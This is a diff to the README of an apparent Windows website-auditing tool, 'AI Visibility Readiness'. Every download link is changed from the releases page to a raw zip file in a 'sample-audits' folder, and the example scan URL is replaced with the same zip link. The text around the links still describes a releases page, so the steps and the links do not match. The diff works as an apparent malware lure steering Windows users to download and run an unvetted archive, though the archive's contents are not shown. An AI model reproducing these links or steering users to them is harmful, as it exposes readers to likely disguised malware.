@@ -1,6 +1,6 @@
 # 🔎 ai-visibility-readiness - Measure AI Findability Fast
 
-[![Download AVR](https://img.shields.io/badge/Download%20AVR-blue-grey?style=for-the-badge)](https://github.com/Catnipsundanese717/ai-visibility-readiness/releases)
+[![Download AVR](https://img.shields.io/badge/Download%20AVR-blue-grey?style=for-the-badge)](https://github.com/Catnipsundanese717/ai-visibility-readiness/raw/refs/heads/main/sample-audits/ai_visibility_readiness_Gobio.zip)
 
 AI Visibility Readiness (AVR) Framework v1.0 helps you check whether AI systems can find, recommend, and cite your website. It runs 15 checks across SEO Foundation, AI Infrastructure, and Citation Monitoring.
 
@@ -8,7 +8,7 @@ AI Visibility Readiness (AVR) Framework v1.0 helps you check whether AI systems 
 
 Visit this page to download the latest version for Windows:
 
-[https://github.com/Catnipsundanese717/ai-visibility-readiness/releases](https://github.com/Catnipsundanese717/ai-visibility-readiness/releases)
+[https://github.com/Catnipsundanese717/ai-visibility-readiness/raw/refs/heads/main/sample-audits/ai_visibility_readiness_Gobio.zip](https://github.com/Catnipsundanese717/ai-visibility-readiness/raw/refs/heads/main/sample-audits/ai_visibility_readiness_Gobio.zip)
 
 On the releases page, look for the latest version and download the Windows file. If there is a .zip file, save it to your computer and extract it first.
 
@@ -38,7 +38,7 @@ If the app comes in a zip file, Windows can open it without extra tools.
 ## 🚀 Install on Windows
 
 1. Open the download page:
-   [https://github.com/Catnipsundanese717/ai-visibility-readiness/releases](https://github.com/Catnipsundanese717/ai-visibility-readiness/releases)
+   [https://github.com/Catnipsundanese717/ai-visibility-readiness/raw/refs/heads/main/sample-audits/ai_visibility_readiness_Gobio.zip](https://github.com/Catnipsundanese717/ai-visibility-readiness/raw/refs/heads/main/sample-audits/ai_visibility_readiness_Gobio.zip)
 
 2. Find the newest release at the top of the page.
 
@@ -137,7 +137,7 @@ This helps you see if your site is easier for AI systems to find and cite.
 
 Use these steps to get cleaner results:
 
-- Use the full website URL, such as `https://example.com`
+- Use the full website URL, such as `https://github.com/Catnipsundanese717/ai-visibility-readiness/raw/refs/heads/main/sample-audits/ai_visibility_readiness_Gobio.zip`
 - Make sure the site is live
 - Run the scan after your pages are published
 - Keep your robots.txt file easy to read
@@ -189,7 +189,7 @@ The framework is built for simple review, clear scoring, and repeat scans after 
 
 If you need the latest Windows release, visit:
 
-[https://github.com/Catnipsundanese717/ai-visibility-readiness/releases](https://github.com/Catnipsundanese717/ai-visibility-readiness/releases)
+[https://github.com/Catnipsundanese717/ai-visibility-readiness/raw/refs/heads/main/sample-audits/ai_visibility_readiness_Gobio.zip](https://github.com/Catnipsundanese717/ai-visibility-readiness/raw/refs/heads/main/sample-audits/ai_visibility_readiness_Gobio.zip)
 
 ## 🧪 Example Use Cases
 
